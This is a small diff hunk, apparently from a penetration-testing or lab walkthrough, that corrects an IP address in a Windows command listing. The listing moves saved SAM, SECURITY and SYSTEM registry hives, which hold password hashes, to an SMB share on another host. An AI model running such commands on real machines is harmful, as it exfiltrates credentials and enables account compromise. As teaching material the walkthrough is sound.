@@ -179,7 +179,7 @@ C:\> move sam.save \\10.10.14.89\CompData
 C:\> move security.save \\10.10.14.89\CompData
         1 file(s) moved.
 
-C:\> move system.save \\10.10.15.16\CompData
+C:\> move system.save \\10.10.14.89\CompData
         1 file(s) moved.
 ```
 
